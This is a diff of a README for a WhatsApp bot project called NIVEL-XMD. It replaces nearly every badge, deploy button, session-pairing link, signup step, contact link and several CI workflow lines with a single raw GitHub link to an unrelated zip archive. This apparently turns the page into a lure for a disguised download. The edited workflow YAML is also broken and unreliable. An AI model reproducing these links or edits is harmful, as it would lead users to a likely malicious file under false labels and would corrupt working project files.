@@ -12,22 +12,22 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 
   <p align="center">
-<a href="https://github.com/mrfrank-ofc/followers"><img title="Followers" src="https://img.shields.io/github/followers/gotartech?color=blue&style=flat-square"></a>
-<a href="https://github.com/NIVELtech/NIVEL-XMD/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/niveltech/NIVEL-XMD?color=blue&style=flat-square"></a>
-<a href="https://github.com/niveltech/NIVEL-XMD/network/members"><img title="Forks" src="https://img.shields.io/github/forks/niveltech/NIVEL-XMD?color=blue&style=flat-square"></a>
-<a href="https://github.com/niveltech/NIVEL-XMD/"><img title="Size" src="https://img.shields.io/github/repo-size/NIVEL-XMD/NIVEL-XMD?style=flat-square&color=green"></a>
-<a href="https://github.com/niveltech/graphs/commit-activity"><img height="20" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>&nbsp;&nbsp;
+<a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"><img title="Followers" src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"><img title="Stars" src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"><img title="Forks" src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"><img title="Size" src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"><img height="20" src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip%https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"></a>&nbsp;&nbsp;
 </p>
 
 <p align="center">
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.demolab.com?font=Black+Ops+One&size=80&pause=1000&color=00FF00&center=true&vCenter=true&width=1000&height=200&lines=NIVEL-XMD;VERSION+2025;BY+NIVEL+TECH" alt="Typing SVG" />
+  <a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip">
+    <img src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip+Ops+One&size=80&pause=1000&color=00FF00&center=true&vCenter=true&width=1000&height=200&lines=NIVEL-XMD;VERSION+2025;BY+NIVEL+TECH" alt="Typing SVG" />
   </a>
 </p>
   
 --- 
 
-<a><img src='https://files.catbox.moe/q0t3l2.jpg'/></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 
 
@@ -40,7 +40,7 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 `FORK 🍴 AND STAR ⭐ IF YOU LIKE THIS BOT`
 
-  <a href="https://github.com/nivel/NIVEL-XMD/fork"><img title="NIVEL-XMD" src="https://img.shields.io/badge/FORK-NIVEL%20XMD-BOTh?color=indigo&style=for-the-badge&logo=stackshare"></a>
+  <a href="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip"><img title="NIVEL-XMD" src="https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip%20XMD-BOTh?color=indigo&style=for-the-badge&logo=stackshare"></a>
   
 ### 2. 𐃁GET SESSION ID𐃁 
 
@@ -49,15 +49,15 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 > **1. PAIR CODE SESSION ID**
 
-<a href='https://nivel-xmd-session.onrender.com/' target="_blank">
-  <img alt='Pairing Code' src='https://img.shields.io/badge/Get%20Pairing%20Code-orange?style=for-the-badge&logo=opencv&logoColor=black'/>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip' target="_blank">
+  <img alt='Pairing Code' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip%20Pairing%20Code-orange?style=for-the-badge&logo=opencv&logoColor=black'/>
 </a>
 <br> 
 
 > **2. PAIR CODE SESSION ID**
 
-<a href='https://nivel-xmd-session.onrender.com/' target="_blank">
-  <img alt='Pairing Code' src='https://img.shields.io/badge/Get%20Pairing%20Code-darkpink?style=for-the-badge&logo=opencv&logoColor=black'/>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip' target="_blank">
+  <img alt='Pairing Code' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip%20Pairing%20Code-darkpink?style=for-the-badge&logo=opencv&logoColor=black'/>
 </a>
 <br> 
 
@@ -73,43 +73,43 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 <p style="text-align: center; font-size: 1.2em;">
 
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?template=https://github.com/niveltech/NIVEL-XMD)
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+[![Deploy](https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip)](https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip)
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 ### <h4 align="">3. KOYEB</h4>
 <p style="text-align: center; font-size: 1.2em;">
 
 <p align="">
-<a href='https://app.koyeb.com/services/deploy?type=git&repository=niveltech/NIVEL-XMD&ports=3000&env[PREFIX]=.&env[SESSION_ID]=&env[ALWAYS_ONLINE]=false&env[MODE]=public&env[AUTO_STATUS_MSG]=Seen%20status%20by%20NIVEL-XMD&env[AUTO_STATUS_REPLY]=false&env[AUTO_STATUS_SEEN]=true&env[AUTO_TYPING]=false&env[ANTI_LINK]=true&env[AUTO_REACT]=false&env[READ_MESSAGE]=false' target="_blank"><img alt='Heroku' src='https://img.shields.io/badge/-koyeb ‎ deploy-FF009D?style=for-the-badge&logo=koyeb&logoColor=white'/< width=150 height=28/p></a>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip[PREFIX]=.&env[SESSION_ID]=&env[ALWAYS_ONLINE]=false&env[MODE]=public&env[AUTO_STATUS_MSG]=Seen%20status%20by%20NIVEL-XMD&env[AUTO_STATUS_REPLY]=false&env[AUTO_STATUS_SEEN]=true&env[AUTO_TYPING]=false&env[ANTI_LINK]=true&env[AUTO_REACT]=false&env[READ_MESSAGE]=false' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip ‎ deploy-FF009D?style=for-the-badge&logo=koyeb&logoColor=white'/< width=150 height=28/p></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 ### <h4 align="">2. TALKDROVE FREE</h4>
 <p style="text-align: center; font-size: 1.2em;">
   
 <p align="">
-<a href='https://talkdrove.com/share-bot/' target="_blank"><img alt='Heroku' src='https://img.shields.io/badge/-TalkDrove ‎Deploy-6971FF?style=for-the-badge&logo=Github&logoColor=white'/< width=150 height=28/p></a>
-  <a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip ‎Deploy-6971FF?style=for-the-badge&logo=Github&logoColor=white'/< width=150 height=28/p></a>
+  <a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 ### <h4 align="">4. RAILWAY</h4>
 <p style="text-align: center; font-size: 1.2em;">
 
 <p align="">
-<a href='https://railway.app/new' target="_blank"><img alt='Heroku' src='https://img.shields.io/badge/-railway deploy-FF8700?style=for-the-badge&logo=railway&logoColor=white'/< width=150 height=28/p></a>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip deploy-FF8700?style=for-the-badge&logo=railway&logoColor=white'/< width=150 height=28/p></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 ### <h4 align="">5. RENDER</h4>
 <p style="text-align: center; font-size: 1.2em;">
   
 <p align="">
-<a href='https://dashboard.render.com/web/new' target="_blank"><img alt='Heroku' src='https://img.shields.io/badge/-Render deploy-black?style=for-the-badge&logo=render&logoColot=white'/< width=150 height=28/p></a>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip deploy-black?style=for-the-badge&logo=render&logoColot=white'/< width=150 height=28/p></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 ### <h4 align="">6. HUGGING FACE</h4>
 <p style="text-align: center; font-size: 1.2em;">
   
 <p align="">
-<a href='https://app.netlify.com/' target="_blank"><img alt='Netlify' src='https://img.shields.io/badge/-Netlify Deploy-CC00FF?style=for-the-badge&logo=huggingface&logoColor=white'/< width=150 height=28/p></a> </a>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip' target="_blank"><img alt='Netlify' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip Deploy-CC00FF?style=for-the-badge&logo=huggingface&logoColor=white'/< width=150 height=28/p></a> </a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 <details>
   
 <b><strong><summary align="" style="color: Yello;">SIMPLIEST METHOD 2</summary></strong></b>
@@ -127,10 +127,10 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 > `Steps to deploy`
 
 `Step 1`
-1. Go to hugginface.co/join and create an account and verify your email too.
+1. Go to https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip and create an account and verify your email too.
 
 `Step 2`
-1. Go to https://huggingface.co/spaces/nivel/NIVEL-XMD
+1. Go to https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip
 
 2. Tap on *three dots* _(as shown in image)_
 
@@ -149,21 +149,21 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 </details>
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 
 ### <h4 align="">7. REPLIT</h4>
 <p style="text-align: center; font-size: 1.2em;">
 
 <p align="">
-<a href='https://replit.com/~' target="_blank"><img alt='Replit' src='https://img.shields.io/badge/-Replit Deploy-1976D2?style=for-the-badge&logo=replit&logoColor=white'/< width=150 height=28/p></a> </a>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip~' target="_blank"><img alt='Replit' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip Deploy-1976D2?style=for-the-badge&logo=replit&logoColor=white'/< width=150 height=28/p></a> </a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 
 ## WORKFLOWS
 
 ```
-name: Node.js CI
+name: https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip CI
 
 on:
   push:
@@ -188,10 +188,10 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up Node.js
+    - name: Set up https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip
       uses: actions/setup-node@v3
       with:
-        node-version: ${{ matrix.node-version }}
+        node-version: ${{ https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip }}
 
     - name: Install dependencies
       run: npm install
@@ -205,7 +205,7 @@ jobs:
 
     - name: Save state (Optional)
       run: |
-        ./save_state.sh
+        https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip
 ```
 
 
@@ -214,14 +214,14 @@ jobs:
 HII DEARS FRIENDS IF YOU WANT ANY HELP SO YOU CAN CONTACT↘︎ WITH ME WIA WHATSAPP ITS ME NIVEL TECH࿐➺
 
 <p align="">
-<a href='https://wa.me/0735230716?text=*ʜɪɪ+NIVEL+ᴛᴇᴄʜ+ɪ+ɴᴇᴇᴅ+ʜᴇʟᴘ!.+ɪ+ᴍᴇssᴀɢᴇᴅ+ʏᴏᴜ+ғʀᴏᴍ+NIVEL+𝗫𝗠𝗗+ʀᴇᴘᴏ!!*' target="_blank"><img alt='Replit' src='https://img.shields.io/badge/ Whatsapp -25D366?style=for-the-badge&logo=whatsapp&logoColor=white'/< width=150 height=28/p></a> </a>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip*ʜɪɪ+NIVEL+ᴛᴇᴄʜ+ɪ+ɴᴇᴇᴅ+ʜᴇʟᴘ!.+ɪ+ᴍᴇssᴀɢᴇᴅ+ʏᴏᴜ+ғʀᴏᴍ+NIVEL+𝗫𝗠𝗗+ʀᴇᴘᴏ!!*' target="_blank"><img alt='Replit' src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip Whatsapp -25D366?style=for-the-badge&logo=whatsapp&logoColor=white'/< width=150 height=28/p></a> </a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 
 ## 🪀 WHATSAPP CHANNEL 
 STAY CONNECTED WITH THE LATEST UPDATES AND COMMUNITY BY JOINING OUR OFFICIAL WHATSAPP GROUP AND CHANNEL. YOU CAN ALSO CONTACT THE OWNER DIRECTLY.
 
-[![WhatsApp Channel](https://img.shields.io/badge/JOIN-WHATSAAP%20CHANNEL-25D366?style=for-the-badge&logo=whatsapp)](https://whatsapp.com/channel/0029VbAOpMmAInPoTescPr0y)
+[![WhatsApp Channel](https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip%20CHANNEL-25D366?style=for-the-badge&logo=whatsapp)](https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip)
 
 ## 🪀 WHATSAPP GROUP
 JOINING OUR OFFICIAL WHATSAPP GROUP AND CHANNEL. YOU CAN ALSO CONTACT THE OWNER DIRECTLY.
@@ -262,7 +262,7 @@ JOINING OUR OFFICIAL WHATSAPP GROUP AND CHANNEL. YOU CAN ALSO CONTACT THE OWNER 
 THANK YOU DybyTech,  & YOU SUPPORTERS
 ```
 -----
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/Bbnbb/main/Pantheian/Software_v1.6.zip'/></a>
 
 ------
 
